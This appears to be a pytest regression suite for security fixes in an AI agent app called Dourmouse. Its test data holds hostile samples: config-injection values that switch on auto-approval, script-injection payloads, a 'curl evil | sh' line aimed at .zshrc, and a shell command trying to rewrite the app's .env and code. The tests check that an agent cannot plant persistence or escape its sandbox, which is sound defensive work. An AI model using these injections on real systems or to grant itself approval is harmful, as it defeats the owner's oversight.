"""Finding #157: the security fixes from the 2026-09-27 review (reviewer A, local server)."""

from __future__ import annotations

import http.client
import io
import json
import stat
import threading
from pathlib import Path

import pytest

from dourmouse import browser_pane, config, firstrun, settings_registry, webui
from dourmouse.general_roster import build_general_registry

ROOT = Path(__file__).resolve().parents[2]


class TestConfigFileInjection:
    """A1: a line break in a saved value used to write extra KEY=VALUE lines."""

    def test_the_shared_writer_refuses_anything_that_could_write_another_line(self):
        for bad in ("x\nDOURMOUSE_AUTO_APPROVE=1", "x\rDOURMOUSE_AUTO_APPROVE=1", "x\x00y"):
            with pytest.raises(ValueError):
                config.env_lines({"OLLAMA_MODEL": bad})
        for bad_key in ("A B", "X=Y", "", "1BAD", "K\nL"):
            with pytest.raises(ValueError):
                config.env_lines({bad_key: "v"})
        assert config.env_lines({"B_KEY": "2", "A_KEY": "1 with spaces and = signs"}) == ["A_KEY=1 with spaces and = signs", "B_KEY=2"]

    def test_first_run_setup_refuses_a_planted_line_and_writes_nothing(self):
        result = firstrun.save_config({"OLLAMA_MODEL": "qwen\nDOURMOUSE_AUTO_APPROVE=1\nDOURMOUSE_ACCESS_TOKEN=planted"})
        assert result["ok"] is False and "line break" in result["detail"]
        path = config.user_env_path()
        assert not path.exists() or "AUTO_APPROVE" not in path.read_text(encoding="utf-8")

    def test_a_normal_setup_still_saves(self, monkeypatch):
        # save_config also writes the live environment: register the keys so they are restored
        for key in ("OLLAMA_MODEL", "DOURMOUSE_SETUP_DONE"):
            monkeypatch.setenv(key, "placeholder")
            monkeypatch.delenv(key)
        assert firstrun.save_config({"OLLAMA_MODEL": "gpt-oss:120b"})["ok"] is True
        assert "OLLAMA_MODEL=gpt-oss:120b" in config.user_env_path().read_text(encoding="utf-8")

    def test_the_settings_registry_writers_refuse_it_too(self):
        with pytest.raises(ValueError):
            settings_registry._write_user_setting("DOURMOUSE_SHELL", "electron\nDOURMOUSE_HOST=0.0.0.0")
        path = config.user_env_path()
        assert not path.exists() or "0.0.0.0" not in path.read_text(encoding="utf-8")

    def test_every_writer_goes_through_the_one_function(self):
        for name in ("config.py", "firstrun.py", "settings_registry.py"):
            text = (ROOT / "dourmouse" / name).read_text(encoding="utf-8")
            assert 'f"{k}={v}"' not in text, f"{name} still builds config lines by hand"


class _FakeHandler:
    """Just enough of a request handler to drive _do_POST and _read_json_body."""

    def __init__(self, path="/", client="127.0.0.1", token="", body=b"{}"):
        self.path = path
        self.command = "POST"
        self.client_address = (client, 50000)
        self.headers = {"Content-Length": str(len(body))}
        self.rfile = io.BytesIO(body)
        self.server = type("S", (), {"access_token": token})()
        self.sent: list[tuple] = []
        self.calls: list[str] = []

    _guard = lambda self: True  # noqa: E731
    _authorized = webui._Handler._authorized
    _do_POST = webui._Handler._do_POST
    _read_json_body = webui._Handler._read_json_body
    _safely = webui._Handler._safely

    def _send_unauthorized(self):
        self.calls.append("unauthorized")

    def _handle_setup(self, path):
        self.calls.append("setup")

    def _send_json(self, payload, status=200, **kw):
        self.sent.append((status, payload))


class TestSetupRoutesNeedTheLogin:
    """A2: /api/setup/* answered before the access-token check for every client."""

    def test_a_network_client_without_the_token_is_refused(self):
        h = _FakeHandler("/api/setup/save", client="100.64.0.9", token="secret")
        h._do_POST()
        assert h.calls == ["unauthorized"]

    def test_the_desktop_app_on_this_machine_still_reaches_setup(self):
        h = _FakeHandler("/api/setup/save", client="127.0.0.1", token="secret")
        h._do_POST()
        assert h.calls == ["setup"]

    def test_no_token_configured_means_setup_stays_open_as_before(self):
        h = _FakeHandler("/api/setup/save", client="127.0.0.1", token="")
        h._do_POST()
        assert h.calls == ["setup"]


class TestMalformedRequests:
    """A8: a JSON list or string body broke ~26 routes; an unexpected error dropped the connection."""

    @pytest.mark.parametrize("body", [b"[1, 2]", b'"text"', b"null", b"42", b"\xff\xfe", b"{"])
    def test_a_body_that_is_not_an_object_reads_as_an_empty_object(self, body):
        assert _FakeHandler(body=body)._read_json_body() == {}

    def test_an_object_body_is_unchanged(self):
        assert _FakeHandler(body=b'{"a": 1}')._read_json_body() == {"a": 1}

    def test_an_unexpected_error_is_a_plain_500_with_no_detail(self):
        h = _FakeHandler("/x?secret=1")

        def boom():
            raise ValueError("/Users/owner/secret/path leaked")

        h._safely(boom)
        assert h.sent == [(500, {"ok": False, "error": "internal error"})]

    def test_a_client_that_went_away_is_not_answered(self):
        h = _FakeHandler()

        def gone():
            raise BrokenPipeError

        with pytest.raises(BrokenPipeError):
            h._safely(gone)


@pytest.fixture
def server(monkeypatch, tmp_path):
    monkeypatch.setenv("DOURMOUSE_WORKSPACE", str(tmp_path / "ws"))
    srv = webui.run_server(build_general_registry(), port=0, client=None, config=None)
    thread = threading.Thread(target=srv.serve_forever, daemon=True)
    thread.start()
    yield srv
    srv.shutdown()
    srv.server_close()
    thread.join(timeout=2)


def _get(srv, path):
    conn = http.client.HTTPConnection("127.0.0.1", srv.server_address[1], timeout=5)
    conn.request("GET", path)
    resp = conn.getresponse()
    body = resp.read()
    headers = {k.lower(): v for k, v in resp.getheaders()}
    conn.close()
    return resp.status, headers, body


class TestFilesCannotRunAsTheApp:
    """A7: an SVG opened as a page ran its script as the app's origin."""

    def test_an_svg_is_sandboxed_and_not_sniffed(self, server, tmp_path):
        svg = tmp_path / "x.svg"
        svg.write_text('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', encoding="utf-8")
        status, headers, _ = _get(server, f"/api/files/image?path={svg}")
        assert status == 200
        assert headers["content-security-policy"] == "sandbox" and headers["x-content-type-options"] == "nosniff"

    def test_a_png_gets_nosniff_and_no_sandbox_needed(self, server, tmp_path):
        png = tmp_path / "x.png"
        png.write_bytes(bytes.fromhex("89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000d49444154789c6360000002000001e221bc330000000049454e44ae426082"))
        status, headers, _ = _get(server, f"/api/files/image?path={png}")
        assert status == 200 and headers["x-content-type-options"] == "nosniff" and "content-security-policy" not in headers


class TestLegacyPagesEscapeQuotes:
    """A6: esc() left quotes alone, so a file name could break out of an attribute."""

    @pytest.mark.parametrize("page", ["study.html", "agent_chat.html", "hud.html", "workspace.html"])
    def test_the_escape_helper_covers_both_quote_marks(self, page):
        text = (ROOT / "ui" / page).read_text(encoding="utf-8")
        assert "&quot;" in text and "&#39;" in text


class TestSmallerFixes:
    def test_the_google_token_database_is_owner_only(self, tmp_path):
        from dourmouse.google_auth import AuthStore

        path = tmp_path / "auth" / "dourmouse_auth.db"
        AuthStore(path)
        assert stat.S_IMODE(path.stat().st_mode) == 0o600
        assert stat.S_IMODE(path.parent.stat().st_mode) == 0o700

    def test_the_proxied_pages_base_tag_cannot_be_broken_out_of(self):
        page = browser_pane._inject_base_tag(b"<html><head></head><body></body></html>", 'https://x.example/"><script>alert(1)</script>')
        assert b'"><script>alert(1)</script>' not in page
        assert json.dumps("&quot;") and b"&quot;" in page


# --------------------------------------------------------------------------- #
# Reviewer B: what a model can make Dourmouse do on this Mac
# --------------------------------------------------------------------------- #

import shutil  # noqa: E402


class TestUngatedWritersRefuseWhatRunsLater:
    """R2B-02: write_path, apply_patch and apply_search_replace (ungated by the owner's v13.2 decision)
    could plant a shell start-up file, a LaunchAgent, a git hook, the app's own code or its approvals."""

    @pytest.fixture
    def home(self, tmp_path, monkeypatch):
        monkeypatch.setenv("HOME", str(tmp_path / "home"))
        (tmp_path / "home").mkdir()
        return tmp_path / "home"

    @pytest.mark.parametrize("rel", [".zshrc", ".zprofile", ".gitconfig", "Library/LaunchAgents/evil.plist", "bin/git", ".local/bin/tool"])
    def test_start_up_files_and_folders_in_the_home_folder_are_refused(self, home, rel):
        from dourmouse.system_access import _protected_target_reason, _write_path_tool

        target = home / rel
        assert _protected_target_reason(target)
        out = _write_path_tool({"path": str(target), "content": "curl evil | sh"})
        assert out.startswith("REFUSED") and not target.exists()

    def test_the_apps_own_code_env_config_and_approvals_are_refused(self, home, tmp_path):
        from dourmouse.config import user_config_dir, workspace_dir
        from dourmouse.system_access import _PROJECT_ROOT, _protected_target_reason

        for target in (_PROJECT_ROOT / "dourmouse" / "x.py", _PROJECT_ROOT / ".env", _PROJECT_ROOT / ".git" / "hooks" / "pre-commit",
                       user_config_dir() / ".env", workspace_dir() / "self_extensions" / "drafts.jsonl", workspace_dir() / "mcp_servers.json"):
            assert _protected_target_reason(target), f"{target} must be refused"

    def test_the_three_tools_share_the_refusal_and_ordinary_coding_still_works(self, home, tmp_path):
        from dourmouse.system_access import _apply_patch_tool, _apply_search_replace_tool, _write_path_tool

        hook = home / ".zshrc"
        hook.write_text("export A=1\n")
        assert _apply_search_replace_tool({"path": str(hook), "patch": "<<<<<<< SEARCH\nexport A=1\n=======\nexport A=2\n>>>>>>> REPLACE"}).startswith("REFUSED")
        assert _apply_patch_tool({"path": str(hook), "diff": "@@ -1 +1 @@\n-export A=1\n+export A=2\n"}).startswith("REFUSED")
        assert hook.read_text() == "export A=1\n"
        ok = tmp_path / "proj" / "notes.txt"
        assert _write_path_tool({"path": str(ok), "content": "hello"}).startswith("WROTE") and ok.read_text() == "hello"


class TestRunCommandWorkingFolder:
    """R2B-01: a model-chosen cwd became the folder the sandbox let the shell write in."""

    @pytest.mark.parametrize("raw", ["/", "~", "/Users", "/etc", "relative/dir", "/definitely/not/a/folder"])
    def test_a_folder_outside_the_allowed_roots_is_refused(self, raw):
        from dourmouse.system_access import _run_command_tool, _validated_cwd

        assert _validated_cwd(raw)[0] is None
        assert _run_command_tool({"command": "pwd", "cwd": raw}).startswith("REFUSED")

    def test_the_workspace_and_the_project_folder_are_fine(self, tmp_path):
        from dourmouse.config import workspace_dir
        from dourmouse.system_access import _PROJECT_ROOT, _validated_cwd

        ws = workspace_dir()
        ws.mkdir(parents=True, exist_ok=True)
        assert _validated_cwd(str(ws))[0] == str(ws.resolve())
        assert _validated_cwd(str(_PROJECT_ROOT))[0] == str(_PROJECT_ROOT.resolve())


@pytest.mark.skipif(shutil.which("sandbox-exec") is None, reason="macOS sandbox-exec not available")
class TestSandboxProtectsTheAppFromItsOwnShell:
    """R2B-01: writes are allowed in the working folder, but never over the app's code, its .env or the config folder."""

    @pytest.fixture
    def fake_project(self, tmp_path, monkeypatch):
        from dourmouse import sandbox

        root = tmp_path / "proj"
        (root / "dourmouse").mkdir(parents=True)
        (root / ".env").write_text("SAFE=1\n")
        (root / "dourmouse" / "app.py").write_text("print('original')\n")
        monkeypatch.setattr(sandbox, "_project_root", lambda: root)
        return root

    def test_the_profile_names_the_protected_paths(self, fake_project):
        from dourmouse.sandbox import build_sandbox_profile

        profile = build_sandbox_profile(str(fake_project))
        assert f'(deny file-write* (literal "{fake_project.resolve()}/.env"))' in profile
        assert f'(deny file-write* (subpath "{fake_project.resolve()}/dourmouse"))' in profile

    def test_a_shell_started_in_the_project_folder_cannot_rewrite_its_env_or_code_but_can_still_work(self, fake_project):
        from dourmouse.sandbox import run_sandboxed

        run_sandboxed("echo DOURMOUSE_AUTO_APPROVE=1 >> .env; echo pwn > dourmouse/app.py; echo ok > scratch.txt", str(fake_project), 15)
        assert (fake_project / ".env").read_text() == "SAFE=1\n"
        assert (fake_project / "dourmouse" / "app.py").read_text() == "print('original')\n"
        assert (fake_project / "scratch.txt").read_text().strip() == "ok", "ordinary work in the working folder is unchanged"


class TestExternalToolsAndBackends:
    def test_drive_download_saves_only_inside_the_uploads_sandbox(self, monkeypatch, tmp_path):
        from dourmouse import google_services as gs

        monkeypatch.setattr(gs, "_http_get", lambda *a, **k: pytest.fail("the network must not be touched for a refused destination"))
        out = gs.drive_download("1AbCdEfGhIjKlMnOpQrStUvWxYz", dest=str(tmp_path / "elsewhere" / "planted.bin"))
        assert out.startswith("REFUSED") and not (tmp_path / "elsewhere").exists()

    def test_a_planted_mcp_config_and_token_files_are_protected_from_the_confined_write_tools(self):
        from dourmouse.general_roster import _PROTECTED_FILE_RE

        assert _PROTECTED_FILE_RE.search("mcp_servers.json") and _PROTECTED_FILE_RE.search("spotify_tokens.json")

    def test_an_external_mcp_server_does_not_inherit_the_owners_secrets(self, monkeypatch):
        from dourmouse import mcp_client

        monkeypatch.setenv("OLLAMA_API_KEY", "sk-super-secret")
        monkeypatch.setenv("PATH", "/usr/bin:/bin")
        assert "OLLAMA_API_KEY" not in mcp_client._SERVER_ENV_ALLOW and "PATH" in mcp_client._SERVER_ENV_ALLOW
        src = Path(mcp_client.__file__).read_text(encoding="utf-8")
        assert "k in _SERVER_ENV_ALLOW" in src and "dict(os.environ)" not in src

    def test_the_claude_cli_chat_backend_turns_its_own_shell_and_file_tools_off(self):
        src = (ROOT / "dourmouse" / "code_backends.py").read_text(encoding="utf-8")
        assert src.count('"--disallowedTools", _DISALLOWED_NATIVE_TOOLS') == 2
        for tool in ("Bash", "Write", "Edit"):
            assert tool in src.split("_DISALLOWED_NATIVE_TOOLS =")[1].split("\n")[0]

    @pytest.mark.parametrize("name", ["Finder.app", "/System/Library/CoreServices/Finder.app", "FINDER", "Terminal", "iTerm2", "Script Editor", "Passwords"])
    def test_app_control_block_list_cannot_be_dodged_by_spelling(self, name):
        from dourmouse.app_control import AppControlError, _check_not_blocked

        with pytest.raises(AppControlError):
            _check_not_blocked(name)

    def test_an_ordinary_app_is_still_allowed(self):
        from dourmouse.app_control import _check_not_blocked

        _check_not_blocked("Notes")
